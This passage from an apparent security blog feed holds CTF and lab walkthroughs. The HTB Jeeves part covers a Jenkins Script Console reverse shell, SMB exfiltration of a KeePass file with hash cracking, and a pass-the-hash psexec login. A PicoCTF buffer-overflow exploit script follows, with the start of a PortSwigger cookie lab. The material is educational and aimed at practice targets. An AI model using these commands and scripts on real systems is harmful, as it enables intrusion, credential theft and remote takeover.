 🚫  Do Not Recurse        │ true
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       11l       26w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
302      GET        0l        0w        0c http://10.10.10.63:50000/askjeeves =&gt; http://10.10.10.63:50000/askjeeves/
[####################] - 2m    119601/119601  0s      found:1       errors:0      
[####################] - 2m    119601/119601  1048/s  http://10.10.10.63:50000/
</code></pre><p>We find a Jenkins dashboard.</p>
<p><img src="/img/jeeves/jenkins_web.png" alt="Jenkins Server"></p>
<p>Jenkins is an open source CI/CD server. In this case, anonymous users have full access to the dashboard. This happens when the Jenkins authorization strategy is set to Unsecured. After compromising the machine, I confirmed this was the case by checking <code>config.xml</code> and finding the unsecured authorization strategy in use.</p>
<p><code>&lt;authorizationStrategy class=&quot;hudson.security.AuthorizationStrategy$Unsecured&quot;/&gt;</code></p>
<h3 id="foothold">Foothold</h3>
<p>We can leverage our permissions to access the Script Console by going to &ldquo;Mange Jenkins&rdquo; &gt; &ldquo;Script Console&rdquo;.</p>
<p><img src="/img/jeeves/script_console.png" alt="Jenkins Script Console"></p>
<p>Here we can execute a Groovy code to get a reverse shell. I got mine from revshells, but it is worth noting that Java shells also work because Groovy is a superset of Java and also runs on the JVM.</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp]
└─$ rlwrap nc -nvlp 8000
listening on [any] 8000 ...
connect to [10.10.14.31] from (UNKNOWN) [10.10.10.63] 49681
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Users\Administrator\.jenkins&gt;
</code></pre><h3 id="privilege-escalation">Privilege Escalation</h3>
<p>I always go for low-hanging fruit first when escalating privileges. Looking at my user privilege, I saw that we have the SEImpersonatePrivilege. We can potentially impersonate a high-privileged user.</p>
<pre tabindex="0"><code>C:\Temp&gt;whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled
</code></pre><p>Unfortunately, this turns out to be a false lead. We&rsquo;ll have to look for other privesc vectors.</p>
<pre tabindex="0"><code>C:\Temp&gt;.\GodPotato-NET4.exe -cmd &#34;cmd /c whoami&#34;
.\GodPotato-NET4.exe -cmd &#34;cmd /c whoami&#34;
[*] CombaseModule: 0x140717164658688
[*] DispatchTable: 0x140717166622152
[*] UseProtseqFunction: 0x140717166124880
[*] UseProtseqFunctionParamCount: 5
[*] HookRPC
[*] Start PipeServer
[*] CreateNamedPipe \\.\pipe\5511e14b-e9ab-43f3-b5d0-bbfe8b6571cb\pipe\epmapper
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 00003c02-0f34-ffff-9033-ef4aa84d1797
[*] DCOM obj OXID: 0xb7f5e435d7866f08
[*] DCOM obj OID: 0x59d6cba54f6519d9
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] UnmarshalObject: 0x80070776
[!] Failed to impersonate security context token
</code></pre><p>Eventually, I come across a KeePass database file.</p>
<pre tabindex="0"><code>C:\&gt;dir /s /b *.kdbx
dir /s /b *.kdbx
C:\Users\kohsuke\Documents\CEH.kdbx
</code></pre><p>KeePass files are password-protected and I don&rsquo;t have the utilities to crack the password on Jeeves, so I set up a SMB share to exfiltrate the file to my attacker machine.</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp]
└─$ impacket-smbserver transfer /tmp/transfer -smb2support
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
</code></pre><p>Now to mount the share and transfer CEH.kdbx.</p>
<pre tabindex="0"><code>C:\Users\kohsuke\Documents&gt;net use M: \\10.10.14.31\transfer
net use M: \\10.10.14.31\transfer
The command completed successfully.


C:\Users\kohsuke\Documents&gt;copy CEH.kdbx M:
copy CEH.kdbx M:
        1 file(s) copied.
</code></pre><p>Next we can extract the KeePass password hash and crack it.</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp/transfer]
└─$ keepass2john CEH.kdbx
CEH:$keepass$*2*6000*0*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9142a6a94f03f6*b73766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48
                                                                                                                                            
┌──(kali㉿kali)-[/tmp/transfer]
└─$ hashcat -a 0 &#39;$keepass$*2*6000*0*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9142a6a94f03f6*b73766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48&#39; /usr/share/wordlists/rockyou.txt -m 13400
</code></pre><p>We get the password <code>moonshine1</code>. We can now view the contents of CEH.kdbx.</p>
<pre tabindex="0"><code>kpcli:/&gt; ls
=== Groups ===
CEH/
kpcli:/&gt; cd CEH
kpcli:/CEH&gt; ls
=== Groups ===
eMail/
General/
Homebanking/
Internet/
Network/
Windows/
=== Entries ===
0. Backup stuff                                                           
1. Bank of America                                   www.bankofamerica.com
2. DC Recovery PW                                                         
3. EC-Council                               www.eccouncil.org/programs/cer
4. It&#39;s a secret                                 localhost:8180/secret.jsp
5. Jenkins admin                                            localhost:8080
6. Keys to the kingdom                                                    
7. Walmart.com                                             www.walmart.com
kpcli:/CEH&gt; 
</code></pre><p>Inside the CEH group, we find some entries and more groups. Further enumeartion reveals that the other groups are empty, so we can focus our efforts on the entries.</p>
<pre tabindex="0"><code>kpcli:/CEH&gt; ls *
=== Entries ===
0. Backup stuff                                                           
1. Bank of America                                   www.bankofamerica.com
2. DC Recovery PW                                                         
3. EC-Council                               www.eccouncil.org/programs/cer
4. It&#39;s a secret                                 localhost:8180/secret.jsp
5. Jenkins admin                                            localhost:8080
6. Keys to the kingdom                                                    
7. Walmart.com                                             www.walmart.com

/CEH/eMail:

/CEH/General:

/CEH/Homebanking:

/CEH/Internet:

/CEH/Network:

/CEH/Windows:
</code></pre><p>There are usernames and password hashes in the entries. I created a user wordlist as well as a password wordlist and sprayed them against Jeeves. In retrospect, this was not necessary since most of these users do not exist on the machine, so I could&rsquo;ve narrowed down my users to <code>Administrator</code>.</p>
<pre tabindex="0"><code>kpcli:/CEH&gt; show -f 0

Title: Backup stuff
Uname: ?
 Pass: aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
  URL: 
Notes: 

kpcli:/CEH&gt; show -f 1

Title: Bank of America
Uname: Michael321
 Pass: 12345
  URL: https://www.bankofamerica.com
Notes: 

kpcli:/CEH&gt; show -f 2

Title: DC Recovery PW
Uname: administrator
 Pass: S1TjAtJHKsugh9oC4VZl
  URL: 
Notes: 

kpcli:/CEH&gt; show -f 3

Title: EC-Council
Uname: hackerman123
 Pass: pwndyouall!
  URL: https://www.eccouncil.org/programs/certified-ethical-hacker-ceh
Notes: Personal login

kpcli:/CEH&gt; show -f 4

Title: It&#39;s a secret
Uname: admin
 Pass: F7WhTrSFDKB6sxHU1cUn
  URL: http://localhost:8180/secret.jsp
Notes: 

kpcli:/CEH&gt; show -f 5

Title: Jenkins admin
Uname: admin
 Pass: 
  URL: http://localhost:8080
Notes: We don&#39;t even need creds! Unhackable! 

kpcli:/CEH&gt; show -f 6

Title: Keys to the kingdom
Uname: bob
 Pass: lCEUnYPjNfIuPZSzOySA
  URL: 
Notes: 

kpcli:/CEH&gt; show -f 7

Title: Walmart.com
Uname: anonymous
 Pass: Password
  URL: http://www.walmart.com
Notes: Getting my shopping on
</code></pre><p>None of the passwords worked, so I tried a pass-the-hash attack using the hash in entry 0 and gained access to the Administrator account.</p>
<p><img src="/img/jeeves/pwned.png" alt="Pass-the-hash"></p>
<p>And with that, Jeeves is owned.</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp]
└─$ impacket-psexec Administrator@10.10.10.63 -hashes &#39;aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00&#39;
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Requesting shares on 10.10.10.63.....
[*] Found writable share ADMIN$
[*] Uploading file EXTSwcYV.exe
[*] Opening SVCManager on 10.10.10.63.....
[*] Creating service ShHJ on 10.10.10.63.....
[*] Starting service ShHJ.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Windows\system32&gt; 
</code></pre>]]></description>
      
    </item>
    
    
    
    <item>
      <title>PicoCTF: Buffer Overflow 2</title>
      <link>http://localhost:1313/posts/pico_buff2/</link>
      <pubDate>Wed, 09 Oct 2024 14:23:13 -0500</pubDate>
      
      <guid>http://localhost:1313/posts/pico_buff2/</guid>
      <description><![CDATA[<h3 id="description">Description</h3>
<p>Buffer Overflow 2 is a binary exploitation challenge that involves overflowing a buffer to not only call the win() function, but also to successfully pass the necessary arguments to it.</p>
<h3 id="walkthrough">Walkthrough</h3>
<p>After downloading the vulnerable binary and its source code, the first thing I did was to view the source code.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/types.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#define BUFSIZE 100
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define FLAGSIZE 64
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">win</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> arg1, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> arg2) {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> buf[FLAGSIZE];
</span></span><span style="display:flex;"><span>  FILE <span style="color:#f92672">*</span>f <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>(<span style="color:#e6db74">&#34;flag.txt&#34;</span>,<span style="color:#e6db74">&#34;r&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (f <span style="color:#f92672">==</span> NULL) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;%s %s&#34;</span>, <span style="color:#e6db74">&#34;Please create &#39;flag.txt&#39; in this directory with your&#34;</span>,
</span></span><span style="display:flex;"><span>                    <span style="color:#e6db74">&#34;own debugging flag.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">fgets</span>(buf,FLAGSIZE,f);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (arg1 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0xCAFEF00D</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (arg2 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0xF00DF00D</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(buf);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">vuln</span>(){
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> buf[BUFSIZE];
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">gets</span>(buf);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">puts</span>(buf);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv){
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">setvbuf</span>(stdout, NULL, _IONBF, <span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">gid_t</span> gid <span style="color:#f92672">=</span> <span style="color:#a6e22e">getegid</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">setresgid</span>(gid, gid, gid);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Please enter your string: &#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">vuln</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>It is apparent that the binary is using the vulnerable <code>gets()</code>
function with a buffer size of 100 bytes. We will need to overflow the buffer and
call <code>win()</code> as well as pass in two arguments, <code>0xCAFEF00D</code> and
<code>0XF00DF00D</code>, in order to complete this challenge.</p>
<p>We can also see that we need a dummy flag in order for the program to execute correctly.</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[~/Writeups/pico/buff2]
└─$ echo &#39;pico{debug}&#39; &gt; flag.txt
</code></pre><p>To overflow the buffer, we first need to find the offset of the eip register. eip stands for
&ldquo;Extended Instruction Pointer&rdquo; and as its name suggests, points to the next instruction to be
executed. We want to write the address of <code>win()</code> to it. To find the address,
we can analyze <code>vuln</code> in gdb&hellip;</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[~/Writeups/pico/buff2]
└─$ gdb vuln
</code></pre><p>&hellip; and find the buffer allocation.</p>
<p><img src="/img/pico/buff2/vuln_gets_alloc.png" alt="GDB vuln buffer size"></p>
<p>Notice that the address of offset <code>ebp-0x6c</code> is pushed onto the stack and is
read by <code>gets()</code>. This means that after calling the <code>gets</code> function, there will be
108 (0x6c) bytes of buffer between the start of the buffer and the <code>ebp</code> register. Note
that the 108 bytes allocated differ from the 100-byte buffer declared in <code>vuln.c</code>.
Discrepancies like this are usually caused by padding or local variables.</p>
<div style="display: flex; justify-content: center;">
    <table>
        <table>
  <thead>
      <tr>
          <th style="text-align: left">High Address</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td style="text-align: left">&hellip;</td>
      </tr>
      <tr>
          <td style="text-align: left">eip (4 bytes)</td>
      </tr>
      <tr>
          <td style="text-align: left">ebp (4 bytes)</td>
      </tr>
      <tr>
          <td style="text-align: left">buffer + padding (108 bytes)</td>
      </tr>
      <tr>
          <td style="text-align: left">&hellip;</td>
      </tr>
      <tr>
          <td style="text-align: left">Low Address</td>
      </tr>
  </tbody>
</table>

    </table>
</div>
<p><code>eip</code> is at a higher address immediately after <code>ebp</code>. Since <code>ebp</code> is a 4 byte register,
<code>eip</code> is 112 (108 + 4) bytes from the start of the buffer. We will therefore need 112 bytes of padding
in our payload before <code>eip</code> starts being overwritten.</p>
<p>Preliminary payload: 112 bytes padding + address of win().</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;./vuln&#34;</span>)
</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./vuln&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>buffer_size <span style="color:#f92672">=</span> <span style="color:#ae81ff">112</span>
</span></span><span style="display:flex;"><span>padding <span style="color:#f92672">=</span> buffer_size <span style="color:#f92672">*</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>addr_main <span style="color:#f92672">=</span> p32(elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#34;main&#34;</span>])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload_list <span style="color:#f92672">=</span> [
</span></span><span style="display:flex;"><span>		padding,
</span></span><span style="display:flex;"><span>		addr_win
</span></span><span style="display:flex;"><span>		]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(payload_list)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><p>I didn&rsquo;t get a clear indication as to whether my payload succeeded, so I added a breakpoint
at the <code>win()</code> function through gdb. If <code>win()</code> is called, the program will pause at the breakpoint.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;./vuln&#34;</span>)
</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./vuln&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>buffer_size <span style="color:#f92672">=</span> <span style="color:#ae81ff">112</span>
</span></span><span style="display:flex;"><span>padding <span style="color:#f92672">=</span> buffer_size <span style="color:#f92672">*</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>addr_win <span style="color:#f92672">=</span> p32(elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#34;win&#34;</span>])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload_list <span style="color:#f92672">=</span> [
</span></span><span style="display:flex;"><span>		padding,
</span></span><span style="display:flex;"><span>		addr_win
</span></span><span style="display:flex;"><span>		]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(payload_list)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;payload&#34;</span>, <span style="color:#e6db74">&#34;wb&#34;</span>) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>    f<span style="color:#f92672">.</span>write(payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>g <span style="color:#f92672">=</span> gdb<span style="color:#f92672">.</span>attach(p, gdbscript <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        b *win
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        r &lt; payload
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#39;&#39;&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><p><img src="/img/pico/buff2/win_stop.png" alt="win() function stop"></p>
<p>We do break, meaning our exploit successfully called <code>win()</code>. Now, we need to add
the arguments <code>0XCAFEF00D</code> and <code>0XF00DF00D</code>. Let us take a look at the stack
frame for <code>win()</code>.</p>
<div style="display: flex; justify-content: center;">
    <table>
        <table>
  <thead>
      <tr>
          <th style="text-align: left">High Address</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td style="text-align: left">&hellip;</td>
      </tr>
      <tr>
          <td style="text-align: left">arg2 (4 bytes)</td>
      </tr>
      <tr>
          <td style="text-align: left">arg1 (4 bytes)</td>
      </tr>
      <tr>
          <td style="text-align: left">eip (4 bytes)</td>
      </tr>
      <tr>
          <td style="text-align: left">ebp (4 bytes)</td>
      </tr>
      <tr>
          <td style="text-align: left">&hellip;</td>
      </tr>
      <tr>
          <td style="text-align: left">Low Address</td>
      </tr>
  </tbody>
</table>

    </table>
</div>
<p>Unlike x64 binaries, all function arguments in x86 programs are passed directly onto the stack.
After jumping to <code>win()</code>, we will also need to overflow <code>eip</code> before we can pass in arg1 and arg2.
In my exploit script I set <code>eip</code> to be overflowed with the address of <code>main()</code> for the sake of
having a valid return address, but any 4 byte value should work since the flag is being printed directly in <code>win()</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;./vuln&#34;</span>)
</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./vuln&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>buffer_size <span style="color:#f92672">=</span> <span style="color:#ae81ff">112</span>
</span></span><span style="display:flex;"><span>padding <span style="color:#f92672">=</span> buffer_size <span style="color:#f92672">*</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>addr_win <span style="color:#f92672">=</span> p32(elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#34;win&#34;</span>])
</span></span><span style="display:flex;"><span>addr_main <span style="color:#f92672">=</span> p32(elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#34;main&#34;</span>])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>arg1 <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0xCAFEF00D</span>)
</span></span><span style="display:flex;"><span>arg2 <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0xF00DF00D</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload_list <span style="color:#f92672">=</span> [
</span></span><span style="display:flex;"><span>        padding,
</span></span><span style="display:flex;"><span>        addr_win,
</span></span><span style="display:flex;"><span>        addr_main,
</span></span><span style="display:flex;"><span>        arg1,
</span></span><span style="display:flex;"><span>        arg2
</span></span><span style="display:flex;"><span>        ]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(payload_list)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><p><img src="/img/pico/buff2/local_flag.png" alt="Local binary flag"></p>
<p>Our exploit was successful. Now all that&rsquo;s left to do is to change the target from
the local binary to the remote pico server.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;saturn.picoctf.net&#34;</span>, <span style="color:#ae81ff">54042</span>) <span style="color:#75715e"># Changed from binary to pico server.</span>
</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./vuln&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>buffer_size <span style="color:#f92672">=</span> <span style="color:#ae81ff">112</span>
</span></span><span style="display:flex;"><span>padding <span style="color:#f92672">=</span> buffer_size <span style="color:#f92672">*</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>addr_win <span style="color:#f92672">=</span> p32(elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#34;win&#34;</span>])
</span></span><span style="display:flex;"><span>addr_main <span style="color:#f92672">=</span> p32(elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#34;main&#34;</span>])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>arg1 <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0xCAFEF00D</span>)
</span></span><span style="display:flex;"><span>arg2 <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0xF00DF00D</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload_list <span style="color:#f92672">=</span> [
</span></span><span style="display:flex;"><span>        padding,
</span></span><span style="display:flex;"><span>        addr_win,
</span></span><span style="display:flex;"><span>        addr_main,
</span></span><span style="display:flex;"><span>        arg1,
</span></span><span style="display:flex;"><span>        arg2
</span></span><span style="display:flex;"><span>        ]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(payload_list)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><p><img src="/img/pico/buff2/flag.png" alt="Pico flag"></p>
]]></description>
      
    </item>
    
    
    
    <item>
      <title>Portswigger Lab: Brute-forcing a stay-logged-in cookie</title>
      <link>http://localhost:1313/posts/cookie_brute/</link>
      <pubDate>Mon, 23 Sep 2024 10:59:43 -0500</pubDate>
      
      <guid>http://localhost:1313/posts/cookie_brute/</guid>
      <description><![CDATA[<h3 id="description">Description</h3>
<p>The &ldquo;Brute-forcing a stay-logged-in cookie&rdquo; lab by PortSwigger features a web application whose stay-logged-in cookies are vulnerable to attack.</p>
<h3 id="walkthrough">Walkthrough</h3>
<p>Navigate to the login page under &ldquo;My account&rdquo;. We will first create a stay-logged-in cookie with the user credentials given to us. Make sure check &ldquo;Stay logged in&rdquo;.</p>
<p><img src="/img/portswigger/cookie-brute/stay_logged_in.png" alt="Login and enable persistent cookies"></p>
<p>Now we can copy the cookie to analyze. Hit <code>Ctr-Shift-i</code> to open the Developer Tools panel and head to the &ldquo;Storage&rdquo; section. The value for the &ldquo;stay-logged-on&rdquo; field is our cookie.</p>
<p><img src="/img/portswigger/cookie-brute/stay_logged_in_cookie.png" alt="Stay-logged-in cookie"></p>
